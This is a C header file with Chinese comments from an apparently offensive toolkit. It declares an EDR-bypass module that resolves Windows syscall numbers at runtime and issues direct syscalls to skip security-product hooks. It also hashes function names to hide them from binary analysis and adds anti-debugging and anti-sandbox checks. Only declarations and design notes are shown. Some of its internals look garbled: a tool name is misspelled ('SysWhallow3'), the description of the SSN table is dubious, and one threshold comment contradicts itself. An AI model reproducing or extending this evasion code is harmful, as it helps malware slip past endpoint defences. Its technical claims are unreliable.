#ifndef DAYANJING_EDR_BYPASS_DIRECT_SYSCALL_H
#define DAYANJING_EDR_BYPASS_DIRECT_SYSCALL_H

/*
 * 11_edr_bypass/direct_syscall.h
 *
 * 直接系统调用（Direct Syscall）—— 绕过 EDR 用户态 hook。
 *
 * 原理：
 *   Windows 下 Nt+ / Zw+ 函数本体形如：
 *     mov r10, rcx
 *     mov eax, <SSN>      ; 系统服务号，即 SSDT 索引
 *     syscall
 *     ret
 *   EDR 通常在 ntdll!Nt+ 的入口处放置 hook（5 字节 JMP 或 INT3 + 回调）。
 *   若调用方直接从 user32/kernel32 经 ntdll 进入，必过 hook。
 *
 *   本模块绕过方式：
 *   1. 运行时解析 ntdll.dll 的 PE 结构，定位导出表
 *   2. 按 SysWhispers3 的 SSS 模式，从 .data 节读取 SSN 表
 *      （.data 节末尾 = SSN 数组，按 AddressOfFunctions 序号排列）
 *   3. 用内联汇编 stub（mov r10,rcx; mov eax,ssn; syscall; ret）
 *      直接执行系统调用，完全不经过 ntdll!Nt+ 的 hook 入口
 *
 * 安全不变量：
 *   - SSN 绝不硬编码，全部运行时解析（跨 Windows 版本/补丁级安全）
 *   - 函数名用 DJB2 哈希存储，二进制中无明文 Zw+ / Nt+
 *   - PE 解析所有偏移做边界校验，恶意/截断 PE 不崩溃
 */

#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * 符号可见性控制。
 * 当编译单元使用 -fvisibility=hidden 时，只有本头文件声明的 API
 * 会被显式导出，内部函数（ds_map_open、rva_to_offset、scan_mov_eax_imm32、
 * ds_syscall_stub 等）不出现在符号表中。
 */
#if defined(_WIN32) || defined(_WIN64)
#  if defined(DS_BUILDING_DLL)
#    define DS_API __declspec(dllexport)
#  else
#    define DS_API __declspec(dllimport)
#  endif
#elif defined(__GNUC__) && (__GNUC__ >= 4)
#  define DS_API __attribute__((visibility("default")))
#else
#  define DS_API
#endif

/* ==================================================================
 * 哈希：DJB2。函数名哈希化，避免二进制残留明文符号。
 * ================================================================== */

typedef uint32_t ds_hash_t;

DS_API ds_hash_t ds_hash(const char *s);

/* ==================================================================
 * 系统调用表条目
 * ================================================================== */

#define DS_MAX_NAME 64

typedef struct {
    ds_hash_t   name_hash;   /* 函数名 DJB2 哈希（小写） */
    uint32_t    ssn;         /* 系统服务号，运行时填充；0 表示未解析 */
    uint16_t    ordinal;     /* 导出序号 */
#ifdef DS_DEBUG
    char        name[DS_MAX_NAME];  /* 调试用：原始函数名，仅 DS_DEBUG 构建保留 */
#endif
} ds_entry_t;

/* 解析结果状态 */
typedef enum {
    DS_OK = 0,
    DS_ERR_INVALID_ARG,      /* 参数为空 */
    DS_ERR_OPEN_FAILED,      /* 无法打开/映射模块 */
    DS_ERR_NOT_PE,           /* 不是有效 PE 文件 */
    DS_ERR_PE_TRUNCATED,     /* PE 结构超出文件边界 */
    DS_ERR_NO_EXPORTS,       /* 无可解析的导出表 */
    DS_ERR_EXPORT_TRUNCATED, /* 导出表字段越界 */
    DS_ERR_NO_SSN_TABLE,     /* .data 节中找不到 SSN 表（非 SSS 布局） */
    DS_ERR_INTERNAL          /* 内部错误 */
} ds_status_t;

DS_API const char *ds_status_str(ds_status_t s);

/* ==================================================================
 * 解析器
 * ================================================================== */

/*
 * ds_resolve
 *   从指定 PE 模块（Windows 下为 ntdll.dll 全路径）解析全部 Zw+ 函数的 SSN。
 *
 * 参数：
 *   module_path  模块路径。Windows 下可用 "C:\\Windows\\System32\\ntdll.dll"，
 *                或传 NULL 时自动探测当前进程加载的模块基址。
 *   out          输出数组
 *   cap          out 容量（条目数）
 *   count        输出：实际解析到的条目数
 *
 * 返回：
 *   DS_OK 表示成功；否则返回错误码。
 *
 * SSS 模式说明：
 *   SysWhallow3 的发现：ntdll 的 .data 节中，紧接所有函数体之后，存在一张
 *   按 AddressOfFunctions 序号排列的 SSN 表。每个 Zw+ 函数的 prologue
 *   "mov eax, imm32" 的 imm32 即该表对应项的值。
 *   定位方法：SSN 表起点 = .data 节基址 + .data 节 VirtualSize 对齐后的位置，
 *   或直接按 Zw+ 函数 prologue 扫描取 SSN 作为备选。
 */
DS_API ds_status_t ds_resolve(const char *module_path,
                              ds_entry_t *out, size_t cap, size_t *count);

/*
 * ds_resolve_by_name
 *   解析单个命名函数的 SSN。name 为 "ZwQuerySystemInformation" 形式。
 *   成功返回 DS_OK 且 *ssn 被填充；失败返回错误码。
 */
DS_API ds_status_t ds_resolve_by_name(const char *module_path,
                                     const char *name,
                                     uint32_t *ssn);

/* ==================================================================
 * 执行器
 * ================================================================== */

/*
 * ds_syscall
 *   用指定 SSN 直接发起系统调用。
 *
 * 参数布局（x64 Windows ABI）：
 *   a1..a4 对应 rcx, rdx, r8, r9（前 4 个整数参数）
 *   ssn    系统服务号，载入 eax
 *
 * 注意：超过 4 个参数的调用需额外栈传参，本封装不覆盖，需调用方手写 stub。
 *       常规 Zw+ 调用（NtOpenProcess/NtAllocateVirtualMemory 等）均在 4 参内。
 *
 * 返回：rax 的原始值（NTSTATUS 或返回数据）。
 *
 * 平台差异：
 *   Windows x64 : 真实执行 syscall 指令
 *   Linux x86_64: 占位实现，返回 SSN（供沙箱单元测试验证解析逻辑）
 *   其他        : 返回 (uintptr_t)-1
 */
DS_API uintptr_t ds_syscall(uintptr_t a1, uintptr_t a2,
                            uintptr_t a3, uintptr_t a4,
                            uint32_t ssn);

/*
 * ds_invoke
 *   按函数名哈希查表并执行。找不到返回 (uintptr_t)-2。
 */
DS_API uintptr_t ds_invoke(const ds_entry_t *table, size_t count,
                           ds_hash_t name_hash,
                           uintptr_t a1, uintptr_t a2,
                           uintptr_t a3, uintptr_t a4);

/* ==================================================================
 * 反调试 / 反沙箱
 * ================================================================== */

/*
 * ds_anti_debug
 *   检测当前进程是否被调试器附加。
 *   Windows: IsDebuggerPresent() + CheckRemoteDebuggerPresent() + NtQueryInformationProcess
 *   Linux  : 读取 /proc/self/status 的 TracerPid
 *   返回：true 表示检测到调试器。
 */
DS_API bool ds_anti_debug(void);

/*
 * ds_anti_sandbox
 *   轻量级沙箱/虚拟机检测（无文件落地、无注册表枚举，降低检测面）。
 *   检查项：
 *     - 进程数异常少（< 30，正常桌面机通常 > 80）
 *     - 内存总量偏小（< 2GB 常为主机，沙箱多为 1GB）
 *     - 常见沙箱用户名片段（不分发，仅本地比对）
 *   返回：true 表示疑似沙箱环境。
 *
 * 注意：本检测非决定性，仅供策略参考；误报可能导致正常环境不工作。
 */
DS_API bool ds_anti_sandbox(void);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EDR_BYPASS_DIRECT_SYSCALL_H */
